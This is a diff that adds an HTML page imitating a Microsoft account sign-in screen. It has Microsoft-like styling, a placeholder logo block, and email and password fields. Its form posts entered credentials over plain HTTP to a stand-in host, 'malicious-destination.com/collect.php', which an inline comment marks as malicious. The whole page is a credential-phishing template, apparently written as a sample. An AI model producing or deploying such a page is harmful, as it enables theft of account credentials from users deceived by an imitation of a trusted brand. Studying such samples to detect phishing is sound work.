@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Microsoft Account Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-card {
+      background: white;
+      padding: 44px;
+      width: 440px;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    .logo {
+      width: 108px;
+      height: 24px;
+      margin-bottom: 24px;
+      background-color: #5e5e5e; /* Simulated logo block */
+    }
+    h2 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin: 0 0 12px 0;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 6px 10px;
+      margin-bottom: 16px;
+      border: 1px solid #666;
+      font-size: 15px;
+    }
+    button {
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-card">
+    <div class="logo"></div>
+    <h2>Sign in</h2>
+    <!-- Malicious action target pointing to an external HTTP domain -->
+    <form action="http://malicious-destination.com/collect.php" method="POST">
+      <input type="email" placeholder="Email, phone, or Skype" required>
+      <input type="password" placeholder="Password" required>
+      <div>
+        <button type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
